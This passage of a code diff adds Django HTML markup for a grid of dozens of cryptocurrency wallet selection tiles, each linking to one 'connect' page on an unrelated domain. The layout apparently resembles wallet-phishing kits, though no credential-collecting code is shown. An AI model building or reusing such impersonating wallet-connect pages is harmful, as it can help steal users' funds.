+                                        <img src="{% static "static/logo/crypto.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Crypto.com</a></h5>
+                                </div>
+                            </div>
+                        </div>     
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Token Pocket">
+                            <div id="token_pocket" class="sc-author-box select_wallet" data-title="Token Pocket" data-logo="{% static "static/logo/token_pocket.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/token_pocket.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Token Pocket</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Math Wallet">
+                            <div id="math_wallet" class="sc-author-box select_wallet" data-title="Math Wallet" data-logo="{% static "static/logo/math_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/math_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Math Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Ledger Live">
+                            <div id="ledger_live" class="sc-author-box select_wallet" data-title="Ledger Live" data-logo="{% static "static/logo/ledger_live.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/ledger_live.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Ledger Live</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="1Inch">
+                            <div id="_1inch" class="sc-author-box select_wallet" data-title="1Inch" data-logo="{% static "static/logo/1inch.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/1inch.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>1Inch</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Dharma">
+                            <div id="dharma" class="sc-author-box select_wallet" data-title="Dharma" data-logo="{% static "static/logo/dharma.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/dharma.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Dharma</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Trust Vault">
+                            <div id="trust_vault" class="sc-author-box select_wallet" data-title="Trust Vault" data-logo="{% static "static/logo/trust_vault.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/trust_vault.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Trust Vault</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="MYKEY">
+                            <div id="my_key" class="sc-author-box select_wallet" data-title="MYKEY" data-logo="{% static "static/logo/mykey.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/mykey.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>MYKEY</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Atomic">
+                            <div id="atomic" class="sc-author-box select_wallet" data-title="Atomic" data-logo="{% static "static/logo/atomic.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/atomic.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Atomic</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="CoolWallet S">
+                            <div id="cool_wallet_s" class="sc-author-box select_wallet" data-title="CoolWallet S" data-logo="{% static "static/logo/cool_wallet_s.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/cool_wallet_s.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>CoolWallet S</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Nashs">
+                            <div id="nash" class="sc-author-box select_wallet" data-title="Nash" data-logo="{% static "static/logo/nash.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/nash.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Nash</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Coinomi">
+                            <div id="coinomi" class="sc-author-box select_wallet" data-title="Coinomi" data-logo="{% static "static/logo/coinomi.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/coinomi.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Coinomi</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="GridPlus">
+                            <div id="gridplus" class="sc-author-box select_wallet" data-title="GridPlus" data-logo="{% static "static/logo/gridplus.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/gridplus.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>GridPlus</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Wallet Connect">
+                            <div id="tokenary" class="sc-author-box select_wallet" data-title="Tokenary" data-logo="{% static "static/logo/tokenary.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/tokenary.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Tokenary</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="SafePal">
+                            <div id="safepal" class="sc-author-box select_wallet" data-title="SafePal" data-logo="{% static "static/logo/safepal.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/safepal.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>SafePal</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Infinito">
+                            <div id="infinito" class="sc-author-box select_wallet" data-title="Infinito" data-logo="{% static "static/logo/infinito.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/infinito.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Infinito</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Wallet.io">
+                            <div id="wallet_io" class="sc-author-box select_wallet" data-title="Wallet.io" data-logo="{% static "static/logo/wallet_io.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/wallet_io.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Wallet.io</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Ownbit">
+                            <div id="ownbit" class="sc-author-box select_wallet" data-title="Ownbit" data-logo="{% static "static/logo/ownbit.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/ownbit.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Ownbit</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="EasyPocket">
+                            <div id="easypocket" class="sc-author-box select_wallet" data-title="EasyPocket" data-logo="{% static "static/logo/easypocket.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/easypocket.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>EasyPocket</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Bridge Wallet">
+                            <div id="bridget_wallet" class="sc-author-box select_wallet" data-title="Bridge Wallet" data-logo="{% static "static/logo/bridge_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/bridge_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Bridge Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="ViaWallet">
+                            <div id="via_wallet" class="sc-author-box select_wallet" data-title="ViaWallet" data-logo="{% static "static/logo/via_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/via_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>ViaWallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="BitKeep">
+                            <div id="bitkeep" class="sc-author-box select_wallet" data-title="BitKeep" data-logo="{% static "static/logo/bitkeep.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/bitkeep.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>BitKeep</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Unstoppable Wallet">
+                            <div id="unstoppable_wallet" class="sc-author-box select_wallet" data-title="Unstoppable Wallet" data-logo="{% static "static/logo/unstoppable_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/unstoppable_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Unstoppable Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="HaloDefi Wallet">
+                            <div id="halodefi_wallet" class="sc-author-box select_wallet" data-title="HaloDefi Wallet" data-logo="{% static "static/logo/halodefi_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/halodefi_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>HaloDefi Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Yoroi Wallet">
+                            <div id="dok_wallet" class="sc-author-box select_wallet" data-title="Yoroi Wallet" data-logo="https://play-lh.googleusercontent.com/UlhGKCVtUuXjDDF_fFdDQaF7mdUpMpsKvfQNNQHuwzbNEvvN-sYRNLk308wpWmLQkR4" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/unnamed(4).png" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Yoroi Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Dok Wallet">
+                            <div id="dok_wallet" class="sc-author-box select_wallet" data-title="Dok Wallet" data-logo="{% static "static/logo/dok_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/dok_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Dok Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Cello Wallet">
+                            <div id="celo_wallet" class="sc-author-box select_wallet" data-title="Cello Wallet" data-logo="{% static "static/logo/celo_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/celo_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Cello Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="CoinUs">
+                            <div id="coinus" class="sc-author-box select_wallet" data-title="CoinUs" data-logo="{% static "static/logo/coinus.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/coinus.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>CoinUs</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Valora">
+                            <div id="valora" class="sc-author-box select_wallet" data-title="Valora" data-logo="{% static "static/logo/valora.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/valora.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Valora</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Trustee Wallet">
+                            <div id="trustee_wallet" class="sc-author-box select_wallet" data-title="Trustee Wallet" data-logo="{% static "static/logo/trustee_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/trustee_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Trustee Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Gaurda Wallet">
+                            <div id="guarda_wallet" class="sc-author-box select_wallet" data-title="Gaurda Wallet" data-logo="{% static "static/logo/guarda_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/guarda_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Gaurda Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Jade Wallet">
+                            <div id="jade_wallet" class="sc-author-box select_wallet" data-title="Jade Wallet" data-logo="{% static "static/logo/jade_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/jade_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Jade Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="PlasmaPay">
+                            <div id="plasmapay" class="sc-author-box select_wallet" data-title="PlasmaPay" data-logo="{% static "static/logo/plasmapay.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/plasmapay.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>PlasmaPay</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="O3Wallet">
+                            <div id="o3_wallet" class="sc-author-box select_wallet" data-title="O3Wallet" data-logo="{% static "static/logo/o3_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/o3_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>O3Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="HashKey Me">
+                            <div id="hashkey_me" class="sc-author-box select_wallet" data-title="HashKey Me" data-logo="{% static "static/logo/hashkey_me.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/hashkey_me.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>HashKey Me</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="RWallet">
+                            <div id="rwallet" class="sc-author-box select_wallet" data-title="RWallet" data-logo="{% static "static/logo/rwallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/rwallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>RWallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Flare Wallet">
+                            <div id="flare_wallet" class="sc-author-box select_wallet" data-title="Flare Wallet" data-logo="{% static "static/logo/flare_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/flare_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Flare Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="KyberSwap">
+                            <div id="kyberswap" class="sc-author-box select_wallet" data-title="KyberSwap" data-logo="{% static "static/logo/kyberswap.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/kyberswap.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>KyberSwap</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="AToken Wallet">
+                            <div id="atoken_wallet" class="sc-author-box select_wallet" data-title="AToken Wallet" data-logo="{% static "static/logo/atoken_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/atoken_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>AToken Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Tongue Wallet">
+                            <div id="tongue_wallet" class="sc-author-box select_wallet" data-title="Tongue Wallet" data-logo="{% static "static/logo/tongue_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/tongue_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Tongue Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="XinFin XDC Network">
+                            <div id="xinfin" class="sc-author-box select_wallet" data-title="XinFin XDC Network" data-logo="{% static "static/logo/xinfin.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/xinfin.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>XinFin XDC Network</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Talken Wallet">
+                            <div id="talken_wallet" class="sc-author-box select_wallet" data-title="Talken Wallet" data-logo="{% static "static/logo/talken_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/talken_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Talken Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="KEYRING PRO">
+                            <div id="keyring_pro" class="sc-author-box select_wallet" data-title="KEYRING PRO" data-logo="{% static "static/logo/keyring_pro.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/keyring_pro.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>KEYRING PRO</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Midas Wallet">
+                            <div id="midas_wallet" class="sc-author-box select_wallet" data-title="Midas Wallet" data-logo="{% static "static/logo/midas_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
